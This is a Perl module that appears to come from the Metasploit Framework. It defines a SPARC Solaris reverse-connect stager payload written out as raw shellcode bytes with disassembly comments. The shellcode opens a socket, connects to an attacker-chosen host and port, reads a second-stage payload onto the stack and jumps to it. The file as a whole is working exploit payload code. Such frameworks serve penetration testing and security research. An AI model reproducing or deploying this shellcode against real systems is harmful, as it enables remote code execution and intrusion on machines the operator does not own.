package Msf::PayloadComponent::SolarisReverseStager;
use strict;
use base 'Msf::PayloadComponent::SolarisPayload';
sub _Load {
  Msf::PayloadComponent::SolarisPayload->_Import('Msf::PayloadComponent::ReverseConnection');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
    'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
    'Arch'         => [ 'sparc' ],
    'Priv'         => 0,
    'OS'           => [ 'solaris' ],
    'Multistage'   => 1,      
    'Size'         => '',
    'SolarisPayload' =>
    {   
        Offsets => { 'LPORT' => [10, 'n'], 'LHOST' => [12, 'ADDR'] },   
        Payload =>
            "\x40\x00\x00\x04".     # call         0x10368
            "\x90\x10\x20\x02".     # mov          2, %o0
            "\x00\x02\x41\x41".     # unimp        0x24141
            "\x7f\x00\x00\x01".     # call         0xfffffffffc010368
            "\x92\x10\x20\x02".     # mov          2, %o1
            "\x94\x08\x20\x01".     # and          %g0, 1, %o2
            "\x96\x08\x20\x01".     # and          %g0, 1, %o3
            "\x98\x10\x20\x01".     # mov          1, %o4
            "\x82\x10\x20\xe6".     # mov          230, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x92\x03\xe0\x08".     # add          %o7, 8, %o1
            "\x94\x10\x20\x10".     # mov          16, %o2
            "\xae\x10\x00\x08".     # mov          %o0, %l7
            "\x82\x10\x20\xeb".     # mov          235, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x90\x10\x00\x17".     # mov          %l7, %o0
            "\x92\x10\x00\x0e".     # mov          %sp, %o1
            "\x95\x2d\xe0\x0f".     # sll          %l7, 15, %o2
            "\x82\x10\x20\x03".     # mov          3, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x9f\xc3\x80\x00".     # jmpl         %sp, %o7
            "\xac\x1d\x80\x16",     # xor          %l6, %l6, %l6
    },
};

sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    $hash = $class->MergeHashRec($hash, {'Info' => $info});
    my $self = $class->SUPER::new($hash, @_);
    return($self);
}
